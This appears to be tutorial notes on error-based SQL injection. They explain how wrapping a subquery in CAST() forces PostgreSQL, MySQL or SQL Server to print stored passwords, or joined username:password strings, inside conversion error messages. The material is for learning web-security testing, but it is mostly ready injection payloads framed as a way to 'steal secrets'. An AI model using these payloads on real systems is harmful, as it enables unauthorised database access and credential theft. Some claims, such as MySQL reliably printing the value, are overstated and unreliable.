## The Problem This Solves

Sometimes the website shows errors, but **not the full data** you want. Or the error messages are **cut off** (truncated).

The `CAST()` function gives you a **reliable way** to force the database to print any data you want inside an error message.

---

## What Is CAST()?

`CAST()` is like a **conversion machine**. It takes one type of data and tries to turn it into another type.

| You give it | You ask for | Result |
|-------------|-------------|--------|
| `'123'` (text) | `INT` (number) | ✅ Works → `123` |
| `'hello'` (text) | `INT` (number) | ❌ Error → `"Cannot convert 'hello' to number"` |

The **error message prints the value** that failed to convert!

---

## The Basic Pattern

```sql
CAST((SELECT password FROM users WHERE username='administrator') AS int)
```

### What happens step-by-step:

| Step | Action |
|------|--------|
| 1 | Database runs `SELECT password FROM users...` |
| 2 | It finds the password, let's say `'secret123'` |
| 3 | It tries to convert `'secret123'` to an integer (number) |
| 4 | **FAILS** because `'secret123'` contains letters |
| 5 | Database throws error: `ERROR: invalid input syntax for type integer: "secret123"` |

**The password is now printed in the error message!**

---

## Why This Is Better Than `TO_NUMBER()`

| Method | What it does | Works on |
|--------|-------------|----------|
| `TO_NUMBER()` | Converts to number | Oracle only |
| `CAST(...AS int)` | Converts to integer | **All databases** (MySQL, PostgreSQL, SQL Server, Oracle) |

`CAST()` is **universal** — it works everywhere.

---

## Database-Specific Examples

### PostgreSQL / Oracle
```sql
CAST((SELECT password FROM users) AS int)
```
Error:
```
ERROR: invalid input syntax for type integer: "secret123"
```

### MySQL
```sql
CAST((SELECT password FROM users) AS SIGNED INTEGER)
```
Error:
```
Truncated incorrect DOUBLE value: 'secret123'
```

### SQL Server
```sql
CAST((SELECT password FROM users) AS int)
```
Error:
```
Conversion failed when converting the varchar value 'secret123' to data type int.
```

## When This Is Most Useful

| Situation | Why CAST() helps |
|-----------|------------------|
| **Character limit on error messages** | Some errors cut off long strings; CAST() may still show enough |
| **Need to extract multiple columns** | You can CAST any data type |
| **Database is Oracle** | `TO_NUMBER()` works, but CAST() is cleaner |
| **You don't know the database type** | CAST() works on almost everything |

---

## Extracting Multiple Columns

You can combine data from multiple columns into one error:

```sql
CAST((SELECT username || ':' || password FROM users WHERE username='administrator') AS int)
```

Error message:
```
ERROR: invalid input syntax for type integer: "administrator:secret123"
```

Now you have **both** username and password!

## The One-Sentence Summary

> **The `CAST()` function tries to convert any data (like a password) into a number — when it fails (which it always will for text), the database prints the actual data inside the error message, giving you an instant, one-request way to steal secrets, and it works on almost every database type.**
